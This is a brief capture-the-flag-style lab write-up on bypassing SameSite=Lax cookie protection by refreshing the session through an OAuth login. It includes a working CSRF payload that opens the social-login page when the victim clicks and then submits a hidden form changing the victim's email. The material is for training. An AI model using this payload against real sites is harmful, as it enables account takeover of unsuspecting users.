## Lab: SameSite Lax bypass via cookie refresh

Defense
- session Cookie: Lax


Bypass:
- Lax Cookie is not protected from CSRF within 2 mins (attack window)
- Every time Oauth login reset a new session ==> open a new attack window for 2 mins
- use `window.onclick` to trick victims to open a Oauth login page


```
<script>
    <form method="POST" action="https://0a7c0077038c059b804ca3cd00d000e2.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="hell@web-security-academy.net">
    </form>
    <script>
        window.onclick = () => {
            window.open('https://0a7c0077038c059b804ca3cd00d000e2.web-security-academy.net/social-login');
            setTimeout(changeEmail, 5000);
        }

        function changeEmail() {
            document.forms[0].submit();
        }
    </script>
</script>
```